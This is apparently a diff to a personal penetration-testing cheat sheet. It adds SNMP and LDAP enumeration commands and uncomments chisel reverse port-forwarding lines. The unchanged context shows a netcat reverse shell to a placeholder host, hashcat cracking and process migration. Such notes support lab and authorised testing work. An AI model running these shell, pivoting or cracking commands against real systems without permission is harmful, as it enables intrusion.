@@ -108,9 +108,12 @@ nc -e /bin/bash <IP> <PORT>
 ```
 ## services
 ```bash
-SNMP
+# SNMP
 snmp-check <IP>
-snmpwalk -v1 -c public <IP> 
+snmpwalk -v1 -c public <IP>
+
+# LDAP
+nmap -n -sV --script "ldap* and not brute" <IP>  
 ```
 
 ## etc
@@ -140,6 +143,7 @@ migrate <process_id>
 # cracking hash with hashcat
 hashcat -a -m 400 hashfile /usr/share/wordlists/rockyou.txt
 
-# chisel server -p 3477 --reverse # local
-# chisel client <localip:localport> R:8000:127.0.0.1:8000/tcp # remote
+# reverse port forwading an internal port
+chisel server -p 3477 --reverse # local
+chisel client <localip:localport> R:8000:127.0.0.1:8000/tcp # remote
 ```
